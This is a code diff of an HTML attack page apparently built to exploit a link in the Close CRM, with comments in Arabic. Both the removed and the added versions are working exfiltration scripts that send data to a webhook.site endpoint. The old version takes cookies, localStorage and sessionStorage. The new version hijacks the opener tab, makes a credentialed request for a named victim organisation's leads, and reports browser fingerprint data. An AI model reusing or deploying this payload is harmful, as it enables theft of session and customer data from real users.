@@ -1,33 +1,57 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>XSS Test</title>
+    <title>XSS Exfil</title>
 </head>
 <body>
     <h1>Loading...</h1>
     <script>
-        // 1- نجيب الـ Referrer (ده هو رابط صفحة CRM اللي فيها الرابط)
-        let referrer = document.referrer;
-        
-        // 2- نجرب نجيب الكوكيز (هتفضل فارغة عشان domains مختلفة)
-        let cookies = document.cookie;
-        
-        // 3- نجيب localStorage كله
-        let local = {};
-        for (let i = 0; i < localStorage.length; i++) {
-            let key = localStorage.key(i);
-            local[key] = localStorage.getItem(key);
+        // 1. محاولة قراءة الـ Referrer المباشر (قد يكون فارغاً)
+        let ref = document.referrer || 'No Referrer';
+
+        // 2. محاولة سرقة رابط التاب الأصلي (الـ CRM) عن طريق window.opener
+        // هذه هي الخدعة الذهبية: نأخذ التاب الأصلي ونحوله لـ Webhook بتاعنا
+        let openerUrl = 'No Opener';
+        let openedSuccess = false;
+        if (window.opener && !window.opener.closed) {
+            try {
+                // نحاول ناخد الـ URL بتاع التاب الأصلي (الممنوع بسبب CORS، لكننا هنستخدمه في التوجيه)
+                // بما أننا مش هنقدر نقرأه، هنعمل حيلة: نوجه التاب الأصلي لـ Webhook.
+                // وبهذا، الـ Referer اللي هيوصله هو رابط الـ CRM نفسه!
+                window.opener.location = 'https://webhook.site/ee71332a-2b9b-468a-bcbc-08d4f97ea1e0?method=opener_redirect';
+                openerUrl = 'Redirect initiated';
+                openedSuccess = true;
+            } catch (e) {
+                openerUrl = 'Error: ' + e.message;
+            }
         }
-        
-        // 4- نجيب sessionStorage كله
-        let session = {};
-        for (let i = 0; i < sessionStorage.length; i++) {
-            let key = sessionStorage.key(i);
-            session[key] = sessionStorage.getItem(key);
-        }
-        
-        // 5- نبعت كل حاجة على Webhook بتاعك
-        fetch('https://webhook.site/ee71332a-2b9b-468a-bcbc-08d4f97ea1e0?ref=' + encodeURIComponent(referrer) + '&cookie=' + encodeURIComponent(cookies) + '&local=' + encodeURIComponent(JSON.stringify(local)) + '&session=' + encodeURIComponent(JSON.stringify(session)));
+
+        // 3. محاولة إرسال طلب (fetch) إلى API الـ Close مباشرة من متصفح الضحية
+        // الفكرة: نرسل طلب لـ API، حتى لو منعنا CORS من قراءة الرد، لكن الطلب نفسه هيتنفذ والكوكيز هتروح معاه!
+        // لو API الـ Close مش محمي ضد CSRF، ممكن نحدث بيانات أو نجيبها.
+        let apiResult = 'No API call';
+        // بنحاول نجيب الـ Leads بتاعة المنظمة (المعلومة اللي عندنا)
+        fetch('https://api.close.com/api/v1/lead/?organization=victim_org11', {
+            credentials: 'include' // مهم عشان يبعت الكوكيز الخاصة بالـ CRM
+        }).then(r => r.text()).then(data => {
+            // لو وصلنا هنا (نادراً لأن CORS هيمنع القراءة)، نبعت البيانات.
+            fetch('https://webhook.site/ee71332a-2b9b-468a-bcbc-08d4f97ea1e0?api_data=' + encodeURIComponent(data));
+        }).catch(e => {
+            // لو فشل الطلب بسبب CORS، نبلغ إن الطلب اتبعت على الأقل.
+            fetch('https://webhook.site/ee71332a-2b9b-468a-bcbc-08d4f97ea1e0?api_error=' + encodeURIComponent(e.message));
+        });
+
+        // 4. إرسال كل المعلومات اللي جمعناها (باستثناء API لأنها غير متزامنة) إلى الـ Webhook
+        // نضيف معلومات المتصفح (IP غير ظاهر، لكن نضيف اللغة والوقت)
+        let info = {
+            ref: ref,
+            opener: openerUrl,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            language: navigator.language,
+            userAgent: navigator.userAgent
+        };
+
+        fetch('https://webhook.site/ee71332a-2b9b-468a-bcbc-08d4f97ea1e0?info=' + encodeURIComponent(JSON.stringify(info)));
     </script>
 </body>
 </html>
